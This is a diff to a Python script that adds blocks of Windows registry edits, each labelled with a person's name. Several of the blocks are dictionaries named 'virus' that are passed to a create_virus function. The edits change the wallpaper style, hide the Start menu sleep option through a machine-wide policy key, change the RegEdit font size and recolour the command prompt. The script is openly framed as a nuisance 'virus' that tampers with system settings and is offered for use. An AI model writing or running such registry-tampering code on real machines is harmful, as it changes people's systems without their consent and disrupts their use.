@@ -55,3 +55,33 @@ key5 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Windows\\CurrentVersion\\
 reg.SetValueEx(key5, 'HideIcons', 0, reg.REG_DWORD, 1)
 reg.CloseKey(key5)
 
+# 8. Elok
+key6 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Desktop')
+reg.SetValueEx(key6, 'WallpaperStyle', 0, reg.REG_SZ, '0')
+reg.CloseKey(key6)
+
+# 9. Diana
+virus7 = {
+    'root_key': reg.HKEY_LOCAL_MACHINE,
+    'key_path': 'SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep',
+    'key_name': 'value',
+    'value_type': reg.REG_DWORD,
+    'value': 1
+}
+create_virus(**virus7)
+
+# 10. Andriani
+key7 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegEdit')
+reg.SetValueEx(key7, 'FontSize', 0, reg.REG_DWORD, 0x00000010a)
+reg.CloseKey(key7)
+
+# 11. Fika
+virus8 = {
+    'root_key': reg.HKEY_CURRENT_USER,
+    'key_path': 'SOFTWARE\\Microsoft\\Command Processor',
+    'key_name': 'DefaultColor',
+    'value_type': reg.REG_DWORD,
+    'value': 2
+}
+create_virus(**virus8)
+
